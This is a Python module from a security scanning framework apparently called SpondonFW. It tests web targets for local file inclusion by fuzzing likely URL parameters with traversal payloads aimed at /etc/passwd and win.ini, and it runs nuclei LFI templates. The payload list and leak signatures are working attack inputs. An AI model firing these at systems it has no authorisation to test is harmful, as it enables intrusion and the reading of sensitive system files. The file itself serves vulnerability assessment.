"""SpondonFW - vuln.lfi"""
import time, requests
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import Dict
from core.engine.base_module import BaseModule, ModuleResult

LFI_PARAMS = ["file","page","path","include","doc","document","folder","dir",
              "root","pg","style","template","view","layout","conf","content"]
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2Fetc%2Fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
    "../../../../Windows/win.ini",
]
LFI_SIGNATURES = ["root:x:0:0", "[extensions]", "[fonts]", "bin/bash", "daemon:x"]

class LFIScanner(BaseModule):
    name = "vuln.lfi"
    description = "Local file inclusion and path traversal testing"
    category = "vulnscan"
    tools_required = ["nuclei"]
    input_schema = {"target": "str"}
    output_schema = {"findings": "LFI / path traversal vulnerabilities"}
    tags = ["lfi", "traversal", "phase3"]

    def execute(self, ctx: Dict) -> ModuleResult:
        result = ModuleResult(module_name=self.name, target=ctx["target"])
        result.started_at = time.time()
        target = ctx["target"]
        out = Path(ctx["output_dir"])
        out.mkdir(parents=True, exist_ok=True)
        headers = {"User-Agent": "SpondonFW/1.0"}

        if self._tool_available("nuclei"):
            nout = str(out / "nuclei_lfi.txt")
            self._run_tool(
                f"nuclei -u https://{target} -t vulnerabilities/lfi/ "
                f"-t fuzzing/lfi/ -silent -o {nout} 2>/dev/null", timeout=300
            )
            for line in self._read_lines(nout):
                result.add_finding("lfi_nuclei", line, severity="high", evidence=line)

        urls_file = self._find_param_urls(ctx)
        if urls_file and Path(urls_file).exists():
            for url in self._read_lines(urls_file)[:300]:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param in params:
                    if param.lower() in LFI_PARAMS:
                        for payload in LFI_PAYLOADS[:4]:
                            test_params = dict(params)
                            test_params[param] = [payload]
                            test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                            try:
                                r = requests.get(test_url, headers=headers, timeout=6, verify=False)
                                if any(sig in r.text for sig in LFI_SIGNATURES):
                                    result.add_finding("lfi_confirmed", test_url, severity="critical",
                                        url=test_url, evidence=r.text[:200],
                                        notes=f"Param '{param}' allows path traversal — file contents leaked")
                                    break
                            except Exception:
                                continue

        result.finished_at = time.time()
        return result

    def _find_param_urls(self, ctx):
        for _, res in ctx.get("previous_results", {}).items():
            if hasattr(res, "metadata"):
                f = res.metadata.get("output_files", {}).get("params", "")
                if f and Path(f).exists():
                    return f
        return ""
